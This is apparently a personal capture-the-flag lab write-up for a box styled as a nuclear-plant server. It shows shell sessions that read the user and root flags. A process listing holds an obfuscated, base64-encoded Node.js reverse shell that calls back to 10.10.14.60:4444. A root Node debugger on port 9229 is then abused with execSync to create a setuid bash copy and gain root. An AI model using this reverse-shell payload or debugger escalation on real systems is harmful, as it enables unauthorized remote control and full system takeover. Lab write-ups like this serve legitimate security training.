    Nuclear Dynamics Corp. - Site 7
    
    AUTHORIZED PERSONNEL ONLY
Last login: Mon Aug 3 14:49:18 2026 from 10.10.14.60
engineer@reactor:~$ ls 
user.txt
engineer@reactor:~$ cat user
cat: user: No such file or directory
engineer@reactor:~$ cat user.txt
51169a353bfa252a0a2003f96bc97c33
engineer@reactor:~$ 

```

``
```
env
ps aux
ps aux | grep node

```

``
```
engineer@reactor:~$ ps aux | grep node
node        1398  0.0  2.4 11811244 96476 ?      Ssl  13:48   0:01 next-server (v15.0.3)
root        1400  0.0  1.1 1066408 45988 ?       Ssl  13:48   0:00 /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
node        1653  0.0  0.0   2800  1876 ?        S    14:19   0:00 /bin/sh -c echo bm9kZSAtZSAnZXZhbCgiIFx4MjhmdW5jdGlvblx4MjhceDI5XHg3YiB2YXIgcmVxdWlyZSBceDNkIGdsb2JhbFx4MmVyZXF1aXJlIFx4N2NceDdjIGdsb2JhbFx4MmVwcm9jZXNzXHgyZW1haW5Nb2R1bGVceDJlY29uc3RydWN0b3JceDJlXHg1ZmxvYWRceDNiIGlmIFx4MjhceDIxcmVxdWlyZVx4MjkgcmV0dXJuXHgzYiB2YXIgY21kIFx4M2QgXHgyOGdsb2JhbFx4MmVwcm9jZXNzXHgyZXBsYXRmb3JtXHgyZW1hdGNoXHgyOFx4MmZceDVld2luXHgyZmlceDI5XHgyOSBceDNmIFx4MjJjbWRceDIyIFx4M2EgXHgyMlx4MmZiaW5ceDJmc2hceDIyXHgzYiB2YXIgbmV0IFx4M2QgcmVxdWlyZVx4MjhceDIybmV0XHgyMlx4MjlceDJjIGNwIFx4M2QgcmVxdWlyZVx4MjhceDIyY2hpbGRceDVmcHJvY2Vzc1x4MjJceDI5XHgyYyB1dGlsIFx4M2QgcmVxdWlyZVx4MjhceDIydXRpbFx4MjJceDI5XHgyYyBzaCBceDNkIGNwXHgyZXNwYXduXHgyOGNtZFx4MmMgXHg1Ylx4NWRceDI5XHgzYiB2YXIgY2xpZW50IFx4M2QgdGhpc1x4M2IgdmFyIGNvdW50ZXJceDNkMFx4M2IgZnVuY3Rpb24gU3RhZ2VyUmVwZWF0XHgyOFx4MjlceDdiIGNsaWVudFx4MmVzb2NrZXQgXHgzZCBuZXRceDJlY29ubmVjdFx4Mjg0NDQ0XHgyYyBceDIyMTBceDJlMTBceDJlMTRceDJlNjBceDIyXHgyYyBmdW5jdGlvblx4MjhceDI5IFx4N2IgY2xpZW50XHgyZXNvY2tldFx4MmVwaXBlXHgyOHNoXHgyZXN0ZGluXHgyOVx4M2IgaWYgXHgyOHR5cGVvZiB1dGlsXHgyZXB1bXAgXHgzZFx4M2RceDNkIFx4MjJ1bmRlZmluZWRceDIyXHgyOSBceDdiIHNoXHgyZXN0ZG91dFx4MmVwaXBlXHgyOGNsaWVudFx4MmVzb2NrZXRceDI5XHgzYiBzaFx4MmVzdGRlcnJceDJlcGlwZVx4MjhjbGllbnRceDJlc29ja2V0XHgyOVx4M2IgXHg3ZCBlbHNlIFx4N2IgdXRpbFx4MmVwdW1wXHgyOHNoXHgyZXN0ZG91dFx4MmMgY2xpZW50XHgyZXNvY2tldFx4MjlceDNiIHV0aWxceDJlcHVtcFx4MjhzaFx4MmVzdGRlcnJceDJjIGNsaWVudFx4MmVzb2NrZXRceDI5XHgzYiBceDdkIFx4N2RceDI5XHgzYiBzb2NrZXRceDJlb25ceDI4XHgyMmVycm9yXHgyMlx4MmMgZnVuY3Rpb25ceDI4ZXJyb3JceDI5IFx4N2IgY291bnRlclx4MmJceDJiXHgzYiBpZlx4Mjhjb3VudGVyXHgzY1x4M2QgMTBceDI5XHg3YiBzZXRUaW1lb3V0XHgyOGZ1bmN0aW9uXHgyOFx4MjkgXHg3YiBTdGFnZXJSZXBlYXRceDI4XHgyOVx4M2JceDdkXHgyYyA1XHgyYTEwMDBceDI5XHgzYiBceDdkIGVsc2UgcHJvY2Vzc1x4MmVleGl0XHgyOFx4MjlceDNiIFx4N2RceDI5XHgzYiBceDdkIFN0YWdlclJlcGVhdFx4MjhceDI5XHgzYiBceDdkXHgyOVx4MjhceDI5XHgzYiIpOyc=|((command -v base64>/dev/null&&(base64 --decode||base64 -d))||(command -v openssl>/dev/null&&openssl enc -base64 -d))|sh
node        1656  0.0  0.0   2800  1812 ?        S    14:19   0:00 sh
node        1659  0.0  1.0 728352 40224 ?        Sl   14:19   0:00 node -e eval(" \x28function\x28\x29\x7b var require \x3d global\x2erequire \x7c\x7c global\x2eprocess\x2emainModule\x2econstructor\x2e\x5fload\x3b if \x28\x21require\x29 return\x3b var cmd \x3d \x28global\x2eprocess\x2eplatform\x2ematch\x28\x2f\x5ewin\x2fi\x29\x29 \x3f \x22cmd\x22 \x3a \x22\x2fbin\x2fsh\x22\x3b var net \x3d require\x28\x22net\x22\x29\x2c cp \x3d require\x28\x22child\x5fprocess\x22\x29\x2c util \x3d require\x28\x22util\x22\x29\x2c sh \x3d cp\x2espawn\x28cmd\x2c \x5b\x5d\x29\x3b var client \x3d this\x3b var counter\x3d0\x3b function StagerRepeat\x28\x29\x7b client\x2esocket \x3d net\x2econnect\x284444\x2c \x2210\x2e10\x2e14\x2e60\x22\x2c function\x28\x29 \x7b client\x2esocket\x2epipe\x28sh\x2estdin\x29\x3b if \x28typeof util\x2epump \x3d\x3d\x3d \x22undefined\x22\x29 \x7b sh\x2estdout\x2epipe\x28client\x2esocket\x29\x3b sh\x2estderr\x2epipe\x28client\x2esocket\x29\x3b \x7d else \x7b util\x2epump\x28sh\x2estdout\x2c client\x2esocket\x29\x3b util\x2epump\x28sh\x2estderr\x2c client\x2esocket\x29\x3b \x7d \x7d\x29\x3b socket\x2eon\x28\x22error\x22\x2c function\x28error\x29 \x7b counter\x2b\x2b\x3b if\x28counter\x3c\x3d 10\x29\x7b setTimeout\x28function\x28\x29 \x7b StagerRepeat\x28\x29\x3b\x7d\x2c 5\x2a1000\x29\x3b \x7d else process\x2eexit\x28\x29\x3b \x7d\x29\x3b \x7d StagerRepeat\x28\x29\x3b \x7d\x29\x28\x29\x3b");
node        1666  0.0  0.0   2800  1816 ?        S    14:19   0:00 /bin/sh
node        1672  0.0  0.2  18012 10660 ?        S    14:21   0:00 python3 -c import pty;pty.spawn('/bin/bash')
node        1673  0.0  0.1   8532  5484 pts/0    Ss+  14:21   0:00 /bin/bash
engineer    1758  0.0  0.0   6544  2280 pts/1    S+   14:36   0:00 grep --color=auto node
engineer@reactor:~$ 
engineer@reactor:~$ 
engineer@reactor:~$ node inspect 127.0.0.1:9229
connecting to 127.0.0.1:9229 ... ok
debug> exec("process.getuid()")
0
debug> exec("process.mainModule.require('child_process').execSync('cp /bin/bash /tmp/r00t && chmod +s /tmp/r00t')")
Uint8Array(0)
debug> .exit
engineer@reactor:~$ /tmp/r00t -p
r00t-5.2# ls 
user.txt
r00t-5.2# cat root.txt
cat: root.txt: No such file or directory
r00t-5.2# pwd
/home/engineer
r00t-5.2# cat /root/root.txt
abdf784794d79d04e6a640d7ba9bfd43
r00t-5.2# 

```


![[Pasted image 20260803204648.png]]



![[Pasted image 20260803204617.png]]



![[Pasted image 20260803204547.png]]






![[Pasted image 20260803204732.png]]


![[Pasted image 20260803204803.png]]

